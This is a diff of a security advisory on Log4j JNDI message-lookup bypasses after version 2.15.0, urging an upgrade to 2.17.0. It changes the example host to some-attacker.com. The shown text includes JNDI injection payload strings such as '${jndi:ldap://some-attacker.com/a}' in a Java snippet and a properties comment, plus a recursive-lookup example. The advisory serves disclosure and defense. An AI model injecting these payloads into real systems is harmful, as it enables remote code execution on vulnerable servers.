@@ -99,11 +99,11 @@ there are still code paths in Log4j where message lookups could occur: known exa
 Logger.printf("%s", userInput), or applications that use a custom message factory, where the resulting messages do not
 implement StringBuilderFormattable. There may be other attack vectors.
 
-To summarize, 2.15.0 introduced changes to prevent remote connections in a message lookup (ie. a connection to `attacker.com`
-will be blocked in: `${jndi:ldap://attacker.com/a}`), as well as disabled message lookups when logging by default:
+To summarize, 2.15.0 introduced changes to prevent remote connections in a message lookup (ie. a connection to `some-attacker.com`
+will be blocked in: `${jndi:ldap://some-attacker.com/a}`), as well as disabled message lookups when logging by default:
 
 ```
-String attackerData = "${jndi:ldap://attacker.com/a}";
+String attackerData = "${jndi:ldap://some-attacker.com/a}";
 
 // Message lookups are blocked in this log statement. Payload will not fire by default.
 logger.info("Log string, but no lookup will happen: " + attackerData);
@@ -119,14 +119,14 @@ ThreadContext.put("layout-pattern-value", attackerData);
 An example `log4j2.properties` file might look something like:
 
 ```
-# The attacker data, "${jndi:ldap://attacker.com/a}", will be attempted to be looked up
+# The attacker data, "${jndi:ldap://some-attacker.com/a}", will be attempted to be looked up
 appender.console.layout.pattern = ${ctx:layout-pattern-value} - %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n
 ```
 
 However, since only local connections were allowed in 2.15.0, the impact of this vulnerability were minimal.
 The most impactful way to exploit this vulnerability was to have `String attackerData = "${ctx:layout-pattern-value"`
 which would result in a recursive reference in the lookup. With the reported bypass of the restrictive remote connection
-list, a full RCE is possible in the above code as we can access `attacker.com` now.
+list, a full RCE is possible in the above code as we can access `some-attacker.com` now.
 
 It is strongly recommended that you update to ~~2.16.0~~ 2.17.0 (Updated 12/19), even if you have previously updated to 2.15.0 or 2.16.0, to mitigate these
 new bypasses. (Updated 12/19 due to new DOS found in 2.16.0. Please upgrade to 2.17.0 to mitigate issues in previous versions.)
